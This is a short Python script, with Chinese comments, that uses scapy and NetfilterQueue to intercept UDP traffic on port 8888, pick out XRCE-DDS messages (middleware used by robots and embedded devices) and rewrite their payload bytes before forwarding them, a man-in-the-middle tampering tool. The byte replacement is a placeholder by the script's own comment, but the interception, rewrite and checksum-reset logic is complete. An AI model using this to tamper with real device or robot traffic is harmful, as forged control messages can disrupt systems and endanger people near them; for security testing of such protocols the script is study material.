from scapy.all import *
from netfilterqueue import NetfilterQueue

def process(pkt):
    scapy_pkt = IP(pkt.get_payload())
    if scapy_pkt.haslayer(UDP):
        udp = scapy_pkt[UDP]

        # 判断是否为 XRCE-DDS 数据包（可通过 payload 特征/端口）
        if udp.dport == 8888:
            raw = bytes(udp.payload)
            if b'\x0e\x01' in raw:  # 识别某种 XRCE message type（比如 WRITE_DATA）
                print("[*] XRCE Packet Detected")

                # 示例：替换 payload 中某些字节（此处为伪操作，真实需解码）
                new_payload = raw.replace(b'original_value', b'fake_value')

                # 构造修改后的包
                udp.payload = Raw(load=new_payload)
                scapy_pkt[UDP] = udp
                del scapy_pkt[IP].chksum
                del scapy_pkt[UDP].chksum

                pkt.set_payload(bytes(scapy_pkt))
                print("[+] XRCE packet modified!")

    pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(0, process)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print("Exiting...")

